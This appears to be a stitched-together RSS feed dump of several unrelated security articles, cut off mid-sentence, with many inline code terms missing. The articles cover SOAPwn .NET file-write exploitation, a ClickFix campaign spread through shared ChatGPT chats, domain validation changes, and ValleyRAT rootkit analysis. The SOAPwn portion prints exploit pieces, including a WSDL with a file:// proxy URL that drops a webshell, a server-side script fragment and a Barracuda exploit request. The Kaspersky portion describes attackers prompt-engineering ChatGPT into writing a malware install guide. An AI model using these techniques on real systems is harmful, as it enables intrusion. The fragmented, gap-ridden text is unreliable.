URL, the application usually throws an error such as:Client found response content type of 'application/octet-stream', but expected 'text/xml'. The request failed with an empty responseThis is expected. The application wants a SOAP response, but the filesystem is not capable of sending one.As far as we know, Microsoft has not (yet) added AI capabilities to NTFS, so the filesystem cannot reply to SOAP requests.Reporting to Microsoft #1 - No FixWe had to decide whether this issue belonged to Microsoft or to the applications that used the proxy classes. We concluded that the problem was Microsoft’s responsibility, because the idea of an HTTP client proxy writing SOAP requests to the local filesystem is so bizarre and unpredictable that no developer would reasonably expect it.There were a few more reasons behind that conclusion:The proxy classes literally contain the string  in their names, not .The official documentation states that these classes are intended for use with the HTTP transport protocol: “Represents the base class for all XML Web service client proxies that use the HTTP transport protocol.”A SOAP client that writes its request into a file and then throws an exception because the filesystem cannot provide a SOAP response does not sound like intended behavior.It seemed clear that this should be reported to Microsoft.Author’s note: this first part of the research was performed in 2024, while working at the Zero Day Initiative. This issue was reported to Microsoft through ZDI in March 2024.Predictably, Microsoft treated the behavior as a feature rather than a vulnerability. The response blamed developers and users.According to Microsoft, the URL passed to  should never be user controlled, and it was the developer’s responsibility to validate inputs.Of course, all developers regularly decompile .NET Framework assemblies and read the internal implementation, so they obviously know that an “HTTP client proxy” can be convinced to write data to the filesystem.How could anyone think otherwise?Exploitation Through WSDL ImportsOne year later, a colleague convinced us to take a look at Barracuda Service Center, a widely deployed RMM platform.Disappointingly, it did not take long to find something interesting: a SOAP API method that could be accessed with no authentication at all:public XmlDocument InvokeRemoteMethod(string urlwsdl, string wsmethod, object[] invalues, string[] dllincludes, bool usecredentials)
{
    XmlDocument xdoc = new XmlDocument();
    wsdl_compiler_tk comp = new wsdl_compiler_tk(urlwsdl, wsmethod, invalues); // [1]
    //...
    if (comp.DynamicLoad()) // [2]
    {
        xdoc = comp.InvokeWebMethod(); // [3]
    }
    //...
}
There were so many red flags that it was difficult to list them all:One of the inputs is named , which immediately suggests SSRF potential.The parameters  and  hint at reflection based method invocation.The class  is instantiated at reference point , which is rarely a sign of anything good.Methods named  and  appear later, which again point toward reflection.We began reviewing the code in detail and the simplified flow looked like this:The code fetches the WSDL from an attacker controlled URL.It loads that WSDL using the .NET Framework  and ServiceDescriptionImporter classes.It generates a C# SOAP proxy class based on the imported service description.It compiles the generated proxy into a DLL and loads it.Finally, it executes the attacker controlled method from that proxy class, using the attacker supplied arguments.There is a lot to unpack here.The first thing we wanted to observe was a real example of the generated proxy class. We supplied a simple WSDL to the endpoint and inspected the class that appeared in the newly compiled DLL:public class TestService : SoapHttpClientProtocol
{
	public TestService()
	{
		base.SoapVersion = SoapProtocolVersion.Soap12;
		base.Url = "<http://localhost/test.asmx>";
	}

	[SoapDocumentMethod("<http://tempuri.org/TestMethod>", RequestNamespace = "<http://tempuri.org/>", ResponseNamespace = "<http://tempuri.org/>", Use = SoapBindingUse.Literal, ParameterStyle = SoapParameterStyle.Wrapped)]
	public string TestMethod(string testarg)
	{
		object[] array = base.Invoke("TestMethod", new object[]
		{
			testarg
		});
		return (string)array[0];
	}
}
As everyone says, when things look too good to be true, they generally are?The auto generated class extends , and we already know that this proxy does not correctly handle URLs.In the example, the generated URL is http://localhost/test.asmx. How can we control that value from the WSDL itself? The answer is through the  definition. In our sample WSDL, it appeared as follows:<service name="TestService">
  <port name="TestServiceSoap12" binding="tns:TestServiceSoap12">
    <soap12:address location="<http://localhost/test.asmx>" />
  </port>
</service>
We can also control almost every part of the generated proxy class. For example, we can influence:The proxy class name, such as .The names of the SOAP methods, such as .The arguments for those methods, including both their types and their names, such as .Several other structural elements.The next question was obvious. Does ServiceDescriptionImporter validate the  definition in the WSDL. Will it reject anything that is not  or .We tested this by modifying the WSDL to use a different protocol:<service name="TestService">
  <port name="TestServiceSoap12" binding="tns:TestServiceSoap12">
    <soap12:address location="file:///inetpub/wwwroot/poc.aspx" />
  </port>
</service>
And we triggered code generation again:public TestService()
{
	base.SoapVersion = SoapProtocolVersion.Soap12;
	base.Url = "file:///inetpub/wwwroot/poc.aspx";
}
ServiceDescriptionImporter does not validate the URL used by the generated HTTP client proxy. This applies across all supported proxy types. In practice, this gives us a new and very clean way to exploit the invalid cast issue we identified earlier.Even with that excitement, we had two immediate questions:Is this a standard pattern for generating SOAP clients from WSDL in the .NET Framework, or is this something unusual implemented only by Barracuda.We know we can achieve a pre authentication file write in Barracuda. Can we push it further and achieve RCE.We started with the first question.A quick search for ServiceDescriptionImporter and a visit to the Microsoft documentation confirmed the expected behavior. The description states:Exposes a means of generating client proxy classes for XML Web services.In short, generating C# code from a WSDL file is normal and fully supported. This is the workflow Microsoft expects developers to use.We also asked Claude for its take, because everyone enjoys a bit of vibecoding. Its first suggestion was exactly the same: use ServiceDescriptionImporter and generate the proxy automatically.All of this is important. It shows that WSDL based proxy generation is a normal and encouraged pattern in .NET Framework applications. That means the invalid cast issue is likely reachable in many different codebases that import WSDL files.With this confirmation, and with Microsoft effectively endorsing the design pattern, we moved on to the practical exploitation possibilities.Practical Exploitation #3 - WSDL ImportsAnd then, we found another way.Exploitation through WSDL import is far more powerful than directly abusing .We control the WSDL, which means we control major parts of the generated SOAP HTTP client proxy code.By choosing the SOAP method names, we control the XML tag names in the resulting request.If the application allows us to influence the method arguments, as in the Barracuda example, we also control the values inside those tags.Essentially, the proxy class can generate a SOAP body that looks conceptually like the following:You can see that we have significant control over most of the XML.This looks promising at first, but certain characters such as  and  are always HTML encoded as  and . That means we cannot directly drop an ASP or ASPX webshell using a simple string argument such as .The word directly is important here. A determined researcher can usually find another path. The two main exploitation possibilities introduced by WSDL imports are summarized below.Because we control some of the XML element names, we had a very simple idea. We wanted the generated SOAP body to contain a fragment such as the following:<script runat="server">
	attacker's input to the method, which will be the .NET code
</script>
This is a valid ASPX webshell.The problem is that ServiceDescriptionImporter does not offer a simple way to define attributes inside the SOAP body, so there is no straightforward method to include the crucial  attribute. Booo.Fortunately, there is a more complicated path. It depends entirely on how the targeted codebase deserializes the arguments that are passed to the SOAP method. If you can supply input arguments that are represented as complex types rather than simple  or  values, you can smuggle XML attributes directly into the SOAP body.Across different products we have seen two main deserialization patterns:Complex deserialization based on , or on a default constructor followed by setters. This pattern is common, because the classes generated by ServiceDescriptionImporter are designed to work with these serializers. In this scenario, it is possible to inject XML attributes into the SOAP body.No custom deserialization at all, where the code only accepts simple types such as  or .In short, if you can influence enough of the SOAP body through WSDL control, you can sometimes use this technique to drop a fully functional ASPX webshell and obtain RCE without friction.Payload drops through namespacesSometimes things do not go your way. You might have a situation where:The attacker can deliver a malicious WSDL to the application, which allows the invalid cast to be exploited and enables arbitrary file writes.However, the attacker cannot control the input arguments to any SOAP methods. They might be hard coded, or the application might only call methods that accept no arguments.There is still a path forward. We noticed that there is one part of the WSDL that always appears inside the generated SOAP body, regardless of how the method is invoked: namespaces.Consider the following fragment of WSDL:You can see that the namespace defined in our WSDL is a valid URL, and the query string allows us to smuggle several special characters.When the SOAP method is executed, the generated SOAP request body will include that namespace exactly as provided:The namespace is included directly in the SOAP body. That alone is enough to do things such as:Deliver CSHTML webshells.Deliver malicious PowerShell scripts, including payloads that use constructs like .There are likely other ways to use this technique, but these two were sufficient to exploit both Ivanti Endpoint Manager and Microsoft PowerShell.For example, the following illustrates a valid RCE achieved through a CSHTML upload in Ivanti Endpoint Manager:The only real limitation is that we cannot use the double quote character . This is not a problem for payloads such as CSHTML, where a  can be constructed from an array of .To summarize, WSDL imports create a very powerful exploitation path for the invalid cast issue in . If an attacker controls the imported WSDL, they also control:The target URL, which allows the proxy to interact with the filesystem.The names and types of method arguments.In practice, the exploitation follows two steps. First, the attacker provides a malicious WSDL file, and the application generates an HTTP client proxy from it using ServiceDescriptionImporter.The second step is to trigger execution of the generated SOAP method. This is usually straightforward, because the application is importing the WSDL for a reason and will eventually call the method. The exact trigger depends on the codebase and the intended functionality.A typical example of this second step might look like the following:In many cases, this vulnerability can lead to remote code execution through the upload of a webshell or a valid PowerShell script.There are likely other creative options as well, but we did not need them.Reporting to Microsoft #2 - WSDL UpdateWe reported the issue to Microsoft again in July 2025.The ability to exploit the invalid cast through WSDL imports makes the problem significantly more impactful. Both server side and client side applications in the .NET Framework ecosystem rely on this pattern.People generally do not realize that .NET Framework HTTP client proxies can be forced to use protocols other than HTTP. This appears to be a fundamental flaw in the proxy design.We also explained to Microsoft that several third party applications were already confirmed to be exploitable through this vector. We asked them to consider treating it as a vulnerability in the .NET Framework itself.A fix at the framework level would eliminate all related vulnerabilities across all affected products in one step.We know you are curious about Microsoft’s response, but hold that thought.First, we want to show a few real vulnerabilities in selected products.List of Discovered Vulnerable CodebasesWe meandered through life at this point, and decided to look at a selection of randomly-selected solutions for the appearance of ServiceDescriptionImporter.Exploitation - Barracuda Service Center RMM RCE (CVE-2025-34392)Let us finally pop Barracuda Service Center!We have already shown that it exposes a SOAP API method that generates a SOAP client proxy from an attacker controlled URL. It then invokes an attacker chosen SOAP method with attacker supplied arguments. There is no need to repeat the same diagrams or call flows here.See the beginning of the “Exploitation Through WSDL Imports” section if you need a refresher.Instead, here is a single HTTP request that fully exploits the vulnerability:POST /SCMessaging/scnoc.asmx HTTP/1.1

 is set to a URL that serves our malicious WSDL. is set to , so the application calls the  method in the generated SOAP proxy. contains a single argument, a  object serialized with . This object contains the ASPX webshell code.The malicious WSDL sets the proxy URL to file:///Program Files (x86)/Level Platforms/Service Center/SCMessaging/poc.aspx.This forces the generated  instance to write the SOAP body into that path, which results in a valid webshell being dropped.You can have a look at the extended demo, with the debugger attached. It presents important parts of the code flow and show the entire exploitation process.Exploitation - Umbraco 8 CMSUmbraco CMS is one of the most popular and widely trusted .NET based CMS platforms. Version 8 was the final release built on the .NET Framework and reached End of Life in 2025, although it remains widely deployed.We found that an authenticated user with permission to edit Umbraco Forms can exploit the invalid cast vulnerability to achieve post-authentication RCE. These forms rely on something called a “data source,” and the way these sources are defined immediately triggered our spider senses.Within the above provided functionality, very helpfully we can define a data source of type .Point it at an arbitrary WSDL.Specify which SOAP method Umbraco should execute.This is a perfect setup for WSDL based exploitation. All we need is for Umbraco to generate a  instance from our supplied WSDL.private Assembly BuildAssemblyFromWSDL(Uri webServiceUri)
{
    Assembly result;
    try
    {
        bool flag = string.IsNullOrEmpty(webServiceUri.ToString());
        if (flag)
        {
            throw new Exception("Web Service Not Found");
        }
        XmlTextReader xmlreader = new XmlTextReader(webServiceUri.ToString() + "?wsdl"); // [1]
        ServiceDescriptionImporter descriptionImporter = this.BuildServiceDescriptionImporter(xmlreader); // [2]
        result = this.CompileAssembly(descriptionImporter); // [3]
    }
    catch (Exception exception)
    {
        Current.Logger.Error(exception, "Exception with WebService {WebServiceUrl}", new object[]
        {
            webServiceUri
        });
        throw;
    }
    return result;
}

This code fetches the WSDL from the supplied URL. It then loads it using ServiceDescriptionImporter at reference point . Finally, it generates the proxy code and compiles it into a DLL at reference point .In our example, we created:A SOAP method that accepts no input argumentsA CSHTML webshell payload delivered through the namespaces defined in the WSDLThe result is the following generated SOAP proxy class:You can then trigger the form and watch the generated SOAP method execute in the debugger:And finally, you can enjoy your freshly dropped malicious CSHTML file.We can now look at Microsoft’s final response.What do you think, dear reader? You have two choices:It does not take a genius to predict Microsoft’s final response:After careful investigation, this case does not meet Microsoft's bar for immediate servicing due to this being an application issue, as users should not consume untrusted input that can generate and run code.As expected, this is apparently the developer’s fault. You wrote an application using the .NET Framework HTTP client proxies and somehow failed to read the internal .NET Framework code. How did you miss the part where an HTTP proxy can write SOAP requests to a file and access the filesystem. And of course the part where it can send HTTP requests over FTP.Ok, enough - what do we now have?We now had a new vulnerable sink in the .NET Framework and many more potential vulnerabilities to uncover.Naturally, we began reporting issues to affected vendors we had stumbled into, and once again found ourselves submitting to Microsoft - specifically in PowerShell and SQL Server Integration Services.Since Microsoft stated that the lack of URL validation was strictly the application’s responsibility, we reported the vulnerabilities in Microsoft’s own products and waited politely for patches.Then a familiar message appeared in the PowerShell case:After a thorough review, we have determined that this case does not meet the criteria for immediate servicing. The issue stems from application behavior, where users should avoid consuming untrusted input that could generate and execute code.So first we blame the application. If that is not an option, because it would require fixing Microsoft’s own code, we blame the user. The neanderthal user should have manually verified the WSDL file and realized that it could write SOAP requests to files instead of sending them over HTTP.But as always, there is no vulnerability that cannot be “fixed” with documentation updates and warnings. Our research can be summarized by this commit in the  repository:As a result, Microsoft has not fixed any of the reported vulnerabilities. Slow clap.There you have it, dear reader. This post summarises the research we presented at Black Hat Europe 2025, along with significant depth in the accompanying whitepaper.We walked through the strange behaviour of .NET Framework HTTP client proxies, the accidental file-write superpower hiding in plain sight, and the very real vulnerabilities this unlocked across several well-known enterprise products.At a high level, the story is simple. The .NET Framework allows its HTTP client proxies to be tricked into interacting with the filesystem. With the right conditions, they will happily write SOAP requests into local paths instead of sending them over HTTP. In the best case, this results in NTLM relaying or challenge capture. In the worst case, it becomes remote code execution through webshell uploads or PowerShell script drops.The impact depends on how each application uses the proxy classes, but in practice we achieved RCE in almost every product we investigated. The most powerful exploitation path arises when applications generate HTTP client proxies from attacker-supplied WSDL files using the ServiceDescriptionImporter class. That mechanism alone enabled successful exploitation in products from Barracuda, Ivanti, Microsoft and Umbraco, and it took only a few days of review to find working cases.Search for uses of ServiceDescriptionImporter and check whether it operates on attacker controlled input. If it does, the application may be vulnerable.Search for uses of , ,  and . If an attacker can influence the  property, the application may be vulnerable.This technique is likely to surface in many other codebases, both in-house and vendor-supplied. If the research here proves anything, it is that the .NET Framework still has a few surprises left.The research published by watchTowr Labs is just a glimpse into what powers the watchTowr Platform – delivering automated, continuous testing against real attacker behaviour.By combining Proactive Threat Intelligence and External Attack Surface Management into a single Preemptive Exposure Management capability, the watchTowr Platform helps organisations rapidly react to emerging threats – and gives them what matters most: Gain early access to our research, and understand your exposure, with the watchTowr PlatformREQUEST A DEMO]]></content:encoded></item><item><title>SOAPwn: Pwning .NET Framework Applications Through HTTP Client Proxies And WSDL</title><link>https://labs.watchtowr.com/soapwn-pwning-net-framework-applications-through-http-client-proxies-and-wsdl/</link><author>Piotr Bazydlo (@chudyPB)</author><category>vulns</category><pubDate>Wed, 10 Dec 2025 17:01:32 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[# SOAPwn: Pwning .NET Framework Applications Through HTTP Client Proxies And WSDL

Welcome back! As we near the end of 2025, we are, of course, waiting for the next round of SSLVPN exploitation to occur in January (as it did in 2024 and 2025).

Weeeeeeeee. Before then, we want to clear the decks and see how much research we can publish.

This year at Black Hat Europe, Piotr Bazydlo presented “SOAPwn: Pwning .NET Framework Applications Through HTTP Client Proxies And WSDL”. This research ultimately led to the identification of new primitives in the .NET Framework that, while Microsoft decided deserved DONOTFIX (repeatedly), were successfully weaponized against enterprise-grade appliances to achieve Remote Code Execution.

As always.

Affected solutions, including enterprise-grade appliances identified as affected during our extremely light review included:

- Barracuda Service Center RMM (CVE-2025-34392) - patched in hotfix 2025.1.1.
- Ivanti Endpoint Manager (EPM)
- Umbraco 8 CMS
- Microsoft PowerShell
- Microsoft SQL Server Integration Services
- “Probably” more…

Given the wide usage of .NET and the limitations of hours in a day, the list of affected products should be considered ‘anecdotal’. There are **most definitely** a **significant** number of affected vendors and in-house solutions, but bluntly, we believe we’ve made our point above.

While today’s blog is designed to provide readers with an overview of our research and its outcomes, further depth can be found inside the whitepaper linked here.

To get us all in the right mood - let us show you weaponization of this research against Barracuda Service Center RMM (fixed in hotfix 2025.1.1), now assigned CVE-2025-34392 - preauthenticated, no less.

It's a Christmas miracle!

## HttpWebClientProtocol - Invalid Cast Vulnerability

Back in 2024, we were deep in the SharePoint attack surface (as one does) when we noticed something unusual. In a few places, an attacker could potentially influence the URL that gets passed into a SOAP client proxy.

This proxy extended the .NET Framework class `System.Web.Services.Protocols.SoapHttpClientProtocol`.

To explain this further, the .NET Framework provides three different HTTP client proxy types:

- `SoapHttpClientProtocol`
- `DiscoveryClientProtocol`
- `HttpSimpleClientProtocol`

All of them inherit from the same parent class: `HttpWebClientProtocol`.

To keep things readable, we focus on `SoapHttpClientProtocol`, because it is easily the most common and appears across a wide variety of codebases. Its name and the official documentation both paint a simple picture: it should handle SOAP messages transported over HTTP. Straightforward. Predictable. Safe.

Reality is less cooperative.

To understand how Microsoft intends this class to work, consider their own sample code:

This is a critical problem for all operating systems and all regions. To spread their infection, criminals use every possible trick to use as bait. Unsurprisingly, AI tools have become one of their favorite luring mechanisms this year. In a new campaign discovered by Kaspersky experts, the attackers steer their victims to a website that supposedly contains user guides for installing OpenAI’s new Atlas browser for macOS. What makes the attack so convincing is that the bait link leads to… the official ChatGPT website! But how?The bait-link in search resultsTo attract victims, the malicious actors place paid search ads on Google. If you try to search for “chatgpt atlas”, the very first sponsored link could be a site whose full address isn’t visible in the ad, but is clearly located on the  domain.The page title in the ad listing is also what you’d expect: “ChatGPT™ Atlas for macOS – Download ChatGPT Atlas for Mac”. And a user wanting to download the new browser could very well click that link.A sponsored link in Google search results leads to a malware installation guide disguised as ChatGPT Atlas for macOS and hosted on the official ChatGPT site. How can that be?Clicking the ad does indeed open chatgpt.com, and the victim sees a brief installation guide for the “Atlas browser”. The careful user will immediately realize this is simply some anonymous visitor’s conversation with ChatGPT, which the author made public using the Share feature. Links to shared chats begin with . In fact, it’s clearly stated right above the chat: “This is a copy of a conversation between ChatGPT & anonymous”.However, a less careful or just less AI-savvy visitor might take the guide at face value — especially since it’s neatly formatted and published on a trustworthy-looking site.Variants of this technique have been seen before — attackers have abused other services that allow sharing content on their own domains: malicious documents in Dropbox, phishing in Google Docs, malware in unpublished comments on GitHub and GitLab, crypto traps in Google Forms, and more. And now you can also share a chat with an AI assistant, and the link to it will lead to the chatbot’s official website.Notably, the malicious actors used prompt engineering to get ChatGPT to produce the exact guide they needed, and were then able to clean up their preceding dialog to avoid raising suspicion.The installation guide for the supposed Atlas for macOS is merely a shared chat between an anonymous user and ChatGPT in which the attackers, through crafted prompts, forced the chatbot to produce the desired result and then sanitized the dialogTo install the “Atlas browser”, users are instructed to copy a single line of code from the chat, open Terminal on their Macs, paste and execute the command, and then grant all required permissions.The specified command essentially downloads a malicious script from a suspicious server, , and immediately runs it on the computer. We’re dealing with a variation of the ClickFix attack. Typically, scammers suggest “recipes” like these for passing CAPTCHA, but here we have steps to install a browser. The core trick, however, is the same: the user is prompted to manually run a shell command that downloads and executes code from an external source. Many already know not to run files downloaded from shady sources, but this doesn’t look like launching a file.When run, the script asks the user for their system password and checks if the combination of “current username + password” is valid for running system commands. If the entered data is incorrect, the prompt repeats indefinitely. If the user enters the correct password, the script downloads the malware and uses the provided credentials to install and launch it.The infostealer and the backdoorIf the user falls for the ruse, a common infostealer known as AMOS (Atomic macOS Stealer) will launch on their computer. AMOS is capable of collecting a wide range of potentially valuable data: passwords, cookies, and other information from Chrome, Firefox, and other browser profiles; data from crypto wallets like Electrum, Coinomi, and Exodus; and information from applications like Telegram Desktop and OpenVPN Connect. Additionally, AMOS steals files with extensions TXT, PDF, and DOCX from the Desktop, Documents, and Downloads folders, as well as files from the Notes application’s media storage folder. The infostealer packages all this data and sends it to the attackers’ server.The cherry on top is that the stealer installs a backdoor, and configures it to launch automatically upon system reboot. The backdoor essentially replicates AMOS’s functionality, while providing the attackers with the capability of remotely controlling the victim’s computer.How to protect yourself from AMOS and other malware in AI chatsThis wave of new AI tools allows attackers to repackage old tricks and target users who are curious about the new technology but don’t yet have extensive experience interacting with large language models.What should you do to protect your data, your computer, and your money?If any website, instant message, document, or chat asks you to  — like pressing  or  and then launching PowerShell or Terminal — . You’re very likely facing a ClickFix attack. Attackers typically try to draw users in by urging them to fix a “problem” on their computer, neutralize a “virus”, “prove they are not a robot”, or “update their browser or OS now”. However, a more neutral-sounding option like “install this new, trending tool” is also possible. you didn’t ask for and don’t fully understand.The easiest thing to do is immediately close the website or delete the message with these instructions. But if the task seems important, and you can’t figure out the instructions you’ve just received, consult someone knowledgeable. A second option is to simply paste the suggested commands into a chat with an AI bot, and ask it to explain what the code does and whether it’s dangerous. ChatGPT typically handles this task fairly well.If you ask ChatGPT whether you should follow the instructions you received, it will answer that it’s not safe]]></content:encoded></item><item><title>December Patch Tuesday fixes three zero-days, including one that hijacks Windows devices</title><link>https://www.malwarebytes.com/blog/news/2025/12/december-patch-tuesday-fixes-three-zero-days-including-one-that-hijacks-windows-devices</link><author></author><category>threatintel</category><pubDate>Wed, 10 Dec 2025 16:06:14 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[These updates from Microsoft fix serious security issues, including three that attackers are already exploiting to take control of Windows systems.

Secure connections are the backbone of the modern web, but a certificate is only as trustworthy as the validation process and issuance practices behind it. Recently, the Chrome Root Program and the CA/Browser Forum have taken decisive steps toward a more secure internet by adopting new security requirements for HTTPS certificate issuers.

These initiatives, driven by Ballots SC-080, SC-090, and SC-091, will sunset 11 legacy methods for Domain Control Validation. By retiring these outdated practices, which rely on weaker verification signals like physical mail, phone calls, or emails, we are closing potential loopholes for attackers and pushing the ecosystem toward automated, cryptographically verifiable security.

To allow affected website operators to transition smoothly, the deprecation will be phased in, with its full security value realized by March 2028.
What’s Domain Control Validation?
Domain Control Validation is a security-critical process designed to ensure certificates are only issued to the legitimate domain operator. This prevents unauthorized entities from obtaining a certificate for a domain they do not control. Without this check, an attacker could obtain a valid certificate for a legitimate website and use it to impersonate that site or intercept web traffic.

Before issuing a certificate, a Certification Authority (CA) must verify that the requestor legitimately controls the domain. Most modern validation relies on “challenge-response” mechanisms, for example, a CA might provide a random value for the requestor to place in a specific location, like a DNS TXT record, which the CA then verifies. 

Historically, other methods validated control through indirect means, such as looking up contact information in WHOIS records or sending an email to a domain contact. These methods have been proven vulnerable (example) and the recent efforts retire these weaker checks in favor of robust, automated alternatives. 
Raising the floor of security
The recently passed CA/Browser Forum Server Certificate Working Group Ballots introduce a phased sunset of the following Domain Control Validation methods. Alternative existing methods offer stronger security assurances against attackers trying to obtain fraudulent certificates – and the alternative methods are getting stronger over time, too.

Sunsetted methods relying on email:

Sunsetted methods relying on phone: 

Sunsetted method relying on a reverse lookup:

For everyday users, these changes are invisible - and that’s the point. But, behind the scenes, they make it harder for attackers to trick a CA into issuing a certificate for a domain they don’t control. This reduces the risk that stale or indirect signals, (like outdated WHOIS data, complex phone and email ecosystems, or inherited infrastructure) can be abused. These changes push the ecosystem toward standardized (e.g., ACME), modern, and auditable Domain Control Validation methods. They increase agility and resilience by encouraging site owners to transition to modern Domain Control Validation methods, creating opportunities for faster and more efficient certificate lifecycle management through automation.

These initiatives remove weak links in how trust is established on the internet. That leads to a safer browsing experience , not just users of a single browser, platform, or website.

In some of them (for example, here), the threat actor delivered the well-known **ValleyRAT backdoor**, also referred to as **Winos** or **Winos4.0**, as the final stage. Since this malware family is widely used, modular, and often associated with Chinese threat actors such as Silver Fox, we decided to take a deeper look at its development, plugin system, and the capabilities exposed through individual components.

At first, we focused on collecting as much information as possible from publicly available sources. However, after the initial survey, we realized that despite the first report related to ValleyRAT being dated to early 2023, the existing material is quite limited. Most publications discuss only the specific plugins that happened to be deployed to victims or malware labs during analysis, which in many cases means only one or two plugins.

When a potential victim, including a malware lab, is infected with the ValleyRAT backdoor, the initial modules deployed are usually first-stage plugins such as the “ **Online Module**” or “ **Login Module**”. These act as initial beacons and are responsible for retrieving and loading additional plugins from the ValleyRAT C2 server. It is entirely up to the attacker to decide whether a victim appears interesting enough to receive further components and expose more of the backdoor’s capabilities. Many victims, especially malware labs, do not meet this threshold, meaning analysts only get to see the plugins that operators intentionally delivered.

Because of this limitation, we shifted our attention to searching for leaked ValleyRAT **builders** and **source code**. Normally, materials like these circulate on the dark web within small, restricted communities. Fortunately, in today’s “share whatever, wherever” environment, we were able to obtain them from several publicly available GitHub repositories.

ValleyRAT is strongly associated with Chinese-speaking threat actors, so we expanded our search with Chinese keywords and phrases that seemed relevant to the malware. This approach was successful: we found not only the ValleyRAT builder but also its development structure, including Visual Studio solutions and project files. Although the actual **source code was missing**, we were still able to link individual Visual Studio projects to plugin binaries extracted from the builder.

It is worth mentioning that we achieved these results only after going through many trojanized repositories, including ValleyRAT builders infected with other backdoors. Hackers hacking hackers. Eventually, we located repositories that contained exactly the information we were looking for.

In this publication, we focus on a full dissection of the ValleyRAT modular system. We describe the builder, outline our extraction and analysis methodology, and provide detailed explanations for every plugin used by the malware. We also include an in-depth analysis of one of the most interesting components, the “ **Driver Plugin**”, which embeds a kernel-mode **rootkit**. Special attention is given to the rootkit and its user-mode client, along with the techniques they implement. Finally, with carefully crafted detection rules for all plugins, we present their in-the-wild detection statistics based on both our internal telemetry and public services.

The first interesting repository we identified is related to the ValleyRAT builder, which also functions as a C2 panel and has been publicly available since March 2025. Below is a comparison between the original Chinese repository and its translated version.

The claim about the “ **Effective date: March 25, 2025**” mentioned in the repository structure (with the builder archive itself uploaded on March 26, 2025) correlates with the PE compilation timestamp of the builder: **Wednesday, 26.03.2025 04:10:15 UTC**. This suggests that it is likely one of the latest versions of the ValleyRAT builder.

The second repository, which is slightly older (June 2024), contains development artifacts related to the ValleyRAT plugin system, including Visual Studio solutions and project structures ( **without source code**). A translated version of this repository can be seen below.

The fact that the development structure (without source code) has been publicly available for a while suggests that the **leaked ValleyRAT source code** itself has probably been circulating in the wild as well.

Both repositories are in Chinese, and as an initial step, we focused on the one containing the Visual Studio structure. We then attempted to locate matching artifacts inside the compiled builder package from the first repository.

While the development structure referenced both “ **main**” and “ **auxiliary**” plugins, only the compiled “ **main**” plugins were present inside the builder’s PE resources.

During the analysis of the development structure, one component immediately stood out: a plugin named “ **Driver Plugin**”, which appears to include a kernel‑mode driver component.

We were later able to locate this compiled plugin inside the builder’s resources.

The “Driver Plugin” is a DLL that acts as a user‑mode client for an embedded rootkit driver. Its original filename can be recovered from the Export Directory.

The rootkit driver is stored within the `.data` section of the `Driver Plugin.dll`. After careful extraction that preserved its original `WIN_CERTIFICATE` structure, we identified the exact sample on VirusTotal. The driver retains the original PDB path that closely matches the Visual Studio project path from the development structure.

The driver’s compilation timestamp appears intact: **Sunday, 23.04.2023 08:10:50 UTC**. However, despite being compiled in 2023, it is signed using an expired certificate valid only between **2013–2014**. We believe this certificate was stolen and used to sign the driver.

Even though the certificate had expired, the signature still fell under the Windows Driver Signing Policy – Exceptions (the legacy driver category). For this reason, the rootkit driver could be loaded even on the latest Windows 11 systems. During our initial investigation, the certificate had not yet been revoked, allowing the driver to load successfully; later revocation prevented this.

Using carefully crafted internal detection rules covering the entire ValleyRAT modular system (all “main” plugins and the rootkit driver), we identified approximately **6,000 ValleyRAT‑related samples** in the wild between November 2024 and November 2025. Notably, around **85%** of these detections occurred within the last six months of that period, which correlates with the time the ValleyRAT builder first appeared publicly. This clearly reflects the growing adoption of this modular backdoor.

Another notable observation is that among the detected samples, we found **30 distinct variants** of the ValleyRAT builder and **12 variants** of the rootkit driver. The majority of the detected rootkits were compiled in 2025, based on PE compilation timestamps that appeared intact. Seven of the drivers were still signed with valid (non‑revoked) certificates. Despite all certificates being expired long ago (validity periods ending before 2015), they fall under the driver signing policy exceptions for end‑entity certificates issued before July 29th 2015 that chain to a supported cross‑signed CA. We confirmed that several of these drivers were not properly detected by Microsoft Defender Antivirus, were absent from the latest version of the Microsoft Vulnerable Driver Blocklist, and could still be loaded on fully updated Windows 11 systems with all protection features enabled (including HVCI and Secure Boot). We responsibly disclosed these findings to the **Microsoft Security Intelligence** team.

As expected, an APT‑level threat actor deployed this capability for a reason. ValleyRAT includes a kernel‑mode module that functions as a rootkit and remains loadable even on the latest Windows versions with modern security mitigations in place.

We also discovered an interesting connection between the Chinese Sun‑RAT “company” website ( `https://www.sun-rat.com/`), which advertised a commercial remote‑administration tool, and the ValleyRAT builder. While the main page of the website was accessible during our initial investigation, it has since disappeared, though some subpages (such as the contact and login sections) remain online. By obtaining the Sun‑RAT demo product, we were able to compare it with the ValleyRAT builder.

**Sun-RAT software:**

**ValleyRAT builder:**

The similarities strongly suggest one of two possibilities:

We believe the second scenario is more likely.

In the next section, we dive into the ValleyRAT builder internals, the plugin extraction process, and the functionality of each component in the modular system.

The obtained ValleyRAT builder is a 32-bit PE file, compiled on **Wednesday, 26.03.2025 04:10:15 UTC**, containing the plugins inside its resources. As previously mentioned, the builder includes only the “ **main**” plugins and not the “ **auxiliary**” ones.

To analyze all compiled plugins and any additional utilities embedded elsewhere in the builder (some were found in the `.data` section) or even within the plugins themselves, we needed a reliable extraction strategy. To increase confidence in the correctness of the extraction, we adopted a dual-tool methodology: DIE – Extractor (operating as a smart carver capable of pulling PE32/PE64 files even when nested inside another PE) and Resource Hacker. To validate the extraction results across DIE + Resource Hacker, we compared authentihashes and output sizes of the extracted PE files against expected PE sizes. Below is an example script demonstrating authentihash computation using LIEF:

The analysis reveals the advanced skills of the developers behind ValleyRAT, demonstrating deep knowledge of Windows kernel and user-mode internals, and consistent coding patterns suggesting a small, specialized team.The “” contains an embedded kernel-mode  that, in some cases, retains valid signatures and  on  systems, bypassing built-in protection features. Through detailed reverse engineering, previously unknown capabilities were uncovered, including stealthy driver installation, user-mode shellcode , and  of AV/EDR drivers.The detection  for  in the wild (ITW), derived from carefully crafted detection rules and verified using both internal telemetry and public services, highlight the recent surge in ValleyRAT usage, with approximately  of detected samples appearing in the , coinciding with the  of the .The research underscores the growing accessibility of the ValleyRAT builder and development artifacts, emphasizing that future usage cannot be easily attributed to specific Chinese-speaking threat actors, such as Silver Fox.Throughout 2025, we conducted and published several reports related to our research on the Silver Fox APT. In some of them (for example, here), the threat actor delivered the well-known , also referred to as  or , as the final stage. Since this malware family is widely used, modular, and often associated with Chinese threat actors such as Silver Fox, we decided to take a deeper look at its development, plugin system, and the capabilities exposed through individual components.At first, we focused on collecting as much information as possible from publicly available 